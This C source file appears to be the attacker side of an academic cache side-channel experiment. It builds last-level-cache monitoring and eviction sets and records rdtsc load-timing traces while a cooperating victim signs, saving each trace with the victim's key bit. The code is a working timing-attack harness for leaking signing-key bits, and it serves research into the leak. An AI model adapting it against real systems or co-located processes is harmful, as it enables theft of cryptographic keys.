#include "../util/util.h"
#include "scutil/dont-mesh-around.h"
#include "../util/machine_const.h"

#include <string.h>
#include <x86intrin.h>

#define BUF_SIZE 400 * 1024UL * 1024 /* Buffer Size -> 400*1MB */
#define MAXSAMPLES 100000

static inline void access_ev(struct Node *ev)
{
	// Access EV multiple times (linear access pattern)
	for (int j = 0; j < 4; j++) {
		struct Node *curr_node = ev;
		while (curr_node && curr_node->next && curr_node->next->next) {
			maccess(curr_node->address);
			maccess(curr_node->next->address);
			maccess(curr_node->next->next->address);
			maccess(curr_node->address);
			maccess(curr_node->next->address);
			maccess(curr_node->next->next->address);
			curr_node = curr_node->next;
		}
	}
}

int main(int argc, char **argv)
{
	int i, j;

	// Check arguments
	if (argc != 5) {
		fprintf(stderr, "Wrong Input! Enter desired core ID, slice ID, repetitions, and iteration of interest!\n");
		fprintf(stderr, "Enter: %s <core_ID> <slice_ID> <repetitions> <iteration_of_interest>\n", argv[0]);
		exit(1);
	}

	// Parse core ID
	int core_ID;
	sscanf(argv[1], "%d", &core_ID);
	if (core_ID > NUM_CHA - 1 || core_ID < 0) {
		fprintf(stderr, "Wrong core! core_ID should be less than %d and more than 0!\n", NUM_CHA);
		exit(1);
	}

	// Parse slice number
	int slice_ID;
	sscanf(argv[2], "%d", &slice_ID);
	if (slice_ID > LLC_CACHE_SLICES - 1 || slice_ID < 0) {
		fprintf(stderr, "Wrong slice! slice_ID should be less than %d and more than 0!\n", LLC_CACHE_SLICES);
		exit(1);
	}

	// For this experiment we can use a fixed cache set
	int set_ID = 4;

	// Parse repetitions
	int repetitions;
	sscanf(argv[3], "%d", &repetitions);
	if (repetitions <= 0) {
		fprintf(stderr, "Wrong repetitions! repetitions should be greater than 0!\n");
		exit(1);
	}

	// Parse victim iteration to attack
	int victim_iteration_no;
	sscanf(argv[4], "%d", &victim_iteration_no);
	if (victim_iteration_no <= 0) {
		printf("Wrong victim_iteration_no! victim_iteration_no_1 should be greater than 0!\n");
		exit(1);
	}

	// Create file shared with victim
	volatile struct sharestruct *sharestruct = get_sharestruct();

	// Pin to the desired core
	//
	// This time we do not set the priority like in the RE because
	// doing so would use root and we want our actual attack
	// to be realistic for a user space process
	int cpu = cha_id_to_cpu[core_ID];
	pin_cpu(cpu);

	//////////////////////////////////////////////////////////////////////
	// Set up memory
	//////////////////////////////////////////////////////////////////////

	// Allocate large buffer (pool of addresses)
	void *buffer = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
	if (buffer == MAP_FAILED) {
		perror("mmap");
		exit(1);
	}

	// Write data to the buffer so that any copy-on-write
	// mechanisms will give us our own copies of the pages.
	memset(buffer, 0, BUF_SIZE);

	// Init variables for MS and EV
	uint64_t index1, index2, offset;
	struct Node *monitoring_set = NULL;
	struct Node *curr_node = NULL;
	int monitoring_set_size = 16;
	int total_sets = 32; // FIXME: may need more for ECDSA
	struct Node *ev = NULL;
	int ev_set = set_ID;
	int ev_size = 16;
	int ev_slice = core_ID;

	// Prepare monitoring set
	for (int k = 0; k < total_sets; k++, set_ID += 2) {
		// Find first address in our desired slice and given set
		offset = find_next_address_on_slice_and_set(buffer, slice_ID, set_ID);

		// Save this address in the monitoring set
		append_string_to_linked_list(&monitoring_set, (void *)((uint64_t)buffer + offset));

		if (k == 0) {
			curr_node = monitoring_set;
		} else {
			curr_node = curr_node->next;
		}

		// Get the L1 and L2 cache set indexes of the monitoring set
		index2 = get_cache_set_index((uint64_t)curr_node->address, 2);
		index1 = get_cache_set_index((uint64_t)curr_node->address, 1);

		// Find next addresses which are residing in the desired slice and the same sets in L2/L1
		// These addresses will distribute across 2 LLC sets
		for (i = 1; i < monitoring_set_size; i++) {
			// offset = 2 * 1024 * 1024; // skip to an next address in the next page
			offset = L2_INDEX_STRIDE; // skip to the next address with the same L2 cache set index
			while (index1 != get_cache_set_index((uint64_t)curr_node->address + offset, 1) ||
				   index2 != get_cache_set_index((uint64_t)curr_node->address + offset, 2) ||
				   slice_ID != get_cache_slice_index((void *)((uint64_t)curr_node->address + offset))) {
				offset += L2_INDEX_STRIDE;
			}

			append_string_to_linked_list(&monitoring_set, (void *)((uint64_t)curr_node->address + offset));
			curr_node = curr_node->next;
		}
	}

	// Flush monitoring set
	curr_node = monitoring_set;
	while (curr_node != NULL) {
		_mm_clflush(curr_node->address);
		curr_node = curr_node->next;
	}

	// Prepare EV (local slice)
	for (int k = 0; k < total_sets; k++, ev_set += 2) {

		// Find first address in our desired slice and given set
		offset = find_next_address_on_slice_and_set(buffer, ev_slice, ev_set);

		// Save this address in the ev set
		append_string_to_linked_list(&ev, (void *)((uint64_t)buffer + offset));

		if (k == 0) {
			curr_node = ev;
		} else {
			curr_node = curr_node->next;
		}

		// Get the L1, L2 and L3 cache set indexes of the EV set
		index2 = get_cache_set_index((uint64_t)curr_node->address, 2);
		index1 = get_cache_set_index((uint64_t)curr_node->address, 1);

		// Find next addresses which are residing in the desired slice and the same sets in L2/L1
		// These addresses will distribute across 2 LLC sets
		for (i = 1; i < ev_size; i++) {
			offset = L2_INDEX_STRIDE; // skip to the next address with the same L2 cache set index
			while (index1 != get_cache_set_index((uint64_t)curr_node->address + offset, 1) ||
				   index2 != get_cache_set_index((uint64_t)curr_node->address + offset, 2) ||
				   ev_slice != get_cache_slice_index((void *)((uint64_t)curr_node->address + offset))) {
				offset += L2_INDEX_STRIDE;
			}

			append_string_to_linked_list(&ev, (void *)((uint64_t)curr_node->address + offset));
			curr_node = curr_node->next;
		}
	}

	// Flush ev set
	curr_node = ev;
	while (curr_node != NULL) {
		_mm_clflush(curr_node->address);
		curr_node = curr_node->next;
	}

	//////////////////////////////////////////////////////////////////////
	// Done setting up memory
	//////////////////////////////////////////////////////////////////////

	// Prepare samples array
	uint32_t *samples = (uint32_t *)malloc(sizeof(*samples) * MAXSAMPLES);
	fprintf(stderr, "READY\n");

	// Warm up
	for (i = 0; i < 2000000; i++) {
		curr_node = monitoring_set;
		while (curr_node != NULL) {
			maccess(curr_node->address);
			curr_node = curr_node->next;
		}

		// Evict from the private caches
		_mm_lfence();
		access_ev(ev);
	}

	//////////////////////////////////////////////////////////////////////
	// Ready to go
	//////////////////////////////////////////////////////////////////////

	// Start with a randomized key
	sharestruct->use_randomized_key = 1;

	// Collect data
	uint8_t actual_bit;
	uint8_t prev_bit = 2;
	int rept_index;
	for (rept_index = 0; rept_index < repetitions; rept_index++) {
		// Make it so that the victim switches to a randomized key for this rept
		// FIXME: remove to use the same (default) key always
		sharestruct->use_randomized_key = 1;

		// Prepare
		uint8_t active = 0;
		uint32_t waiting_for_victim = 0;

		// Read addresses from monitoring set into cache
		curr_node = monitoring_set;
		while (curr_node != NULL) {
			maccess(curr_node->address);
			curr_node = curr_node->next;
		}

		// Evict from the private caches
		_mm_lfence();
		access_ev(ev);

		// Double-check that the victim has not started yet
		if (sharestruct->iteration_of_interest_running) {
			fprintf(stderr, "victim already started?\n");
		}

		// Request the victim to sign
		sharestruct->sign_requested = victim_iteration_no;

		// Start monitoring loop
		curr_node = monitoring_set;
		for (i = 0; i < MAXSAMPLES; i++) {

			// Check if the victim's iteration of interest ended
			if (active) {
				if (!sharestruct->iteration_of_interest_running) {
					break;
				}
			}

			// Check if the victim's iteration of interest started
			if (!active) {
				i = 0;
				if (sharestruct->iteration_of_interest_running) {
					active = 1;
				} else {
					waiting_for_victim++;
					if (waiting_for_victim == UINT32_MAX) {
						fprintf(stderr, "Missed run; %d\n", rept_index);
						rept_index--;
						break;
					}
					continue;
				}
			}

			if ((i != 0) && ((i % (total_sets * monitoring_set_size)) == 0)) {
				// Skip when we had to access the EV
				waiting_for_victim = UINT32_MAX;
				break;
			}

			asm volatile(
				".align 32\n\t"
				"lfence\n\t"
				"rdtsc\n\t"				/* eax = TSC (timestamp counter) */
				"movl %%eax, %%r8d\n\t" /* r8d = eax */
				"movq (%1), %%r9\n\t"	/* r9 = *(current->address); LOAD */
				"rdtscp\n\t"			/* eax = TSC (timestamp counter) */
				"sub %%r8d, %%eax\n\t"	/* eax = eax - r8d; get timing difference between the second timestamp and the first one */
				"movl %%eax, %0\n\t"	/* samples[j++] = eax */

				: "=rm"(samples[i]) /* output */
				: "r"(curr_node->address)
				: "rax", "rcx", "rdx", "r8", "r9", "memory");

			curr_node = curr_node->next;
		}

		// Check that the victim's iteration of interest is actually ended
		if (waiting_for_victim == UINT32_MAX || sharestruct->iteration_of_interest_running || i >= MAXSAMPLES) {
			// Wait some time before next trace
			wait_cycles(150000000);
			continue;
		}

		// Get the actual bit (ground truth)
		actual_bit = sharestruct->bit_of_the_iteration_of_interest;

		// Prepare data output file
		char output_data_fn[64];
		sprintf(output_data_fn, "./out/%04d_data_%04d_%" PRIu8 ".out", rept_index, victim_iteration_no, actual_bit);
		FILE *output_data;
		if (!(output_data = fopen(output_data_fn, "w"))) {
			perror("fopen");
			exit(1);
		}

		// Store the samples to disk
		int trace_length = i;
		for (i = 0; i < trace_length; i++) {
			fprintf(output_data, "%" PRIu32 "\n", samples[i]);
		}

		// Wait some time before next trace
		wait_cycles(150000000);

		// Close the files for this trace
		fclose(output_data);
	}

	// Free the buffers and file
	munmap(buffer, BUF_SIZE);
	free(samples);

	// Clean up lists
	struct Node *tmp = NULL;
	for (curr_node = monitoring_set; curr_node != NULL; tmp = curr_node, curr_node = curr_node->next, free(tmp));
	for (curr_node = ev; curr_node != NULL; tmp = curr_node, curr_node = curr_node->next, free(tmp));

	return 0;
}
